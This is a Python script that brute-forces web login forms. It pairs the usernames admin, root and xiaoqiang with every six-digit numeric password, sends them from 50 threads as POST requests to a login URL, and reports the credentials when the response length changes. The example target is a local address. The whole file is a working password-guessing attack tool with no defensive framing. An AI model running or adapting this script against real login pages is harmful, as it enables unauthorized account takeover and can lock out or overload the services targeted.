import requests
import sys
import os
import queue
import threading
import time
class BruteForce():
    def __init__(self, url, user="user", password="pass", num=100,thread=50):
        #程序进行状态
        self.mask=False
        self.url=[]
        self.user_mark = user
        self.pass_mark=password
        self.username=[]
        self.userpasswd=[]
        self.que=queue.Queue(num)
        self.thread=thread
        self.true_passwd=[]
        if isinstance(url, list):
            for i in enumerate(url):
                self.url.append(i[1])
        elif isinstance(url, str):
            self.url = url
        else:
            print("参数类型错误！")

    def _make_username(self,type = 1):
        if type == 1:
            self.username =["admin","root","xiaoqiang"]


    def _make_passwd(self,type = 1):
        if type == 1:
            for i in range(100000,999999):
                self.userpasswd.append(i)
        else:
            pass


    def _make_queue(self):
        for i in self.username:
            for j in self.userpasswd:
                tmp = str(i)+":"+str(j)
                self.que.put(tmp)

    def _make_header(self):
        pass
    def _make_exec(self,type = 1):
        while True:
            if type == 1:
                user,passwd = self.que.get().split(":")
                r = requests.post(self.url,data ={f'{self.user_mark}':f'{user}',f'{self.pass_mark}':f'{passwd}'})
                self.true_passwd.append(len(r.text))
                self.true_passwd = set(self.true_passwd)
                self.true_passwd = list(self.true_passwd)
                # print(user + ":" + passwd)
                if len(self.true_passwd) >= 2 :
                    print(user+":"+passwd)
                    self.true_passwd.clear()
                    os._exit(1)


    def _gogo(self):
        self._make_username()
        self._make_passwd()

        Thread_que = threading.Thread(target=self._make_queue)

        for i in range(self.thread):
            threading.Thread(target=self._make_exec).start()

        Thread_que.start()


if __name__ == '__main__':
    a =  BruteForce("http://127.0.0.1:5000/login")
    a._gogo()
